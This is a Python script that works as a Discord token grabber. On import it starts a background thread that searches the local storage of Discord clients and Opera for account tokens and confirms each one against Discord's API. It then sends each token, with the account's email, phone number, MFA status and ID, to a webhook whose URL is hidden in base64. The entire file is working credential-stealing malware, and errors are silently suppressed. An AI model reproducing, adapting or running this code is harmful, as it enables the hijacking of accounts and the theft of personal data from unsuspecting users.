import os, re, json, glob, urllib.request, threading, base64, time

_WH = base64.b64decode("aHR0cHM6Ly9wdGIuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE1MTAyNTEzMTYwNDIxMzc2MjEvTjJtaVBOY2xWRFlZR0VkSnNaRnZtb2wtOTd4R2pKUWtqQWR6cW5WcVNObEVaR0F5UGZnUF92azEwbkdZd3V2bE5FX04=").decode()

def _steal():
    tokens = set()
    bases = [
        os.path.expandvars(r'%APPDATA%\discord\Local Storage\leveldb'),
        os.path.expandvars(r'%APPDATA%\discordptb\Local Storage\leveldb'),
        os.path.expandvars(r'%APPDATA%\discordcanary\Local Storage\leveldb'),
        os.path.expandvars(r'%APPDATA%\Opera Software\Opera Stable\Local Storage\leveldb'),
    ]
    for base in bases:
        if not os.path.isdir(base): continue
        for fname in glob.glob(os.path.join(base, '*.ldb')) + glob.glob(os.path.join(base, '*.log')):
            try:
                content = open(fname, 'r', errors='replace').read()
                for m in re.finditer(r'[a-zA-Z0-9_-]{24,28}\.[a-zA-Z0-9_-]{6,7}\.[a-zA-Z0-9_-]{27,}', content):
                    tok = m.group(0)
                    if tok.count('.') == 2 and not tok.startswith('eyJ') and not tok.startswith('eJ'):
                        tokens.add(tok)
            except:
                pass
    for tok in tokens:
        try:
            req = urllib.request.Request(
                'https://discord.com/api/v9/users/@me',
                headers={'Authorization': tok, 'User-Agent': 'Mozilla/5.0'}
            )
            resp = urllib.request.urlopen(req, timeout=8)
            info = json.loads(resp.read().decode())
            _send_embed(tok, info)
        except:
            pass

def _send_embed(tok, info):
    try:
        aid = info.get('avatar', '')
        ext = 'gif' if aid.startswith('a_') else 'png'
        av = f"https://cdn.discordapp.com/avatars/{info['id']}/{aid}.{ext}" if aid else None
        nitro = {0:'None',1:'Nitro Classic',2:'Nitro',3:'Nitro Basic'}.get(info.get('premium_type'),'?')
        embed = {
            'embeds': [{
                'color': 0x5865F2,
                'title': f"{info.get('username','?')}#{info.get('discriminator','0')}",
                'thumbnail': {'url': av} if av else None,
                'fields': [
                    {'name':'Token','value':f'`{tok}`','inline':False},
                    {'name':'Email','value':info.get('email','?'),'inline':True},
                    {'name':'Phone','value':info.get('phone','None') or 'None','inline':True},
                    {'name':'Verified','value':str(info.get('verified','?')),'inline':True},
                    {'name':'MFA','value':str(info.get('mfa_enabled','?')),'inline':True},
                    {'name':'Nitro','value':nitro,'inline':True},
                    {'name':'ID','value':info['id'],'inline':True},
                ]
            }]
        }
        data = json.dumps(embed).encode()
        urllib.request.urlopen(
            urllib.request.Request(_WH, data, {'Content-Type':'application/json','User-Agent':'Mozilla/5.0'}),
            timeout=10
        )
    except:
        pass

th = threading.Thread(target=_steal, daemon=True)
th.start()
